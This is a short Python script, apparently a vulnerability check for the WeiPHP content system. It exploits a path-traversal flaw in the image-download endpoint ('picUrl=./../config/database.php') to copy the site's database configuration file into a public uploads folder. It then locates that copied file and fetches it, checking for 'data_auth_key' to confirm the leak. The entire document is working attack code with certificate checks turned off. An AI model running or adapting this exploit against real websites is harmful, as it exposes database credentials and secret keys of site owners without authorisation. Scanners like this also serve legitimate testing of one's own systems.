import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php"
	body='1":1'
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r0=True
	else:
		r0=False
	url=baseurl+"public/index.php/home/file/user_pics"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r1=True
		try:
			img=re.findall("/public/uploads/picture/(.+?)\"",response.text)[0]
		except:
			img=''
	else:
		r1=False
		img=''
	url=baseurl+f"public/uploads/picture/{img}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "data_auth_key" in response.text and "WeiPHP" in response.text:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
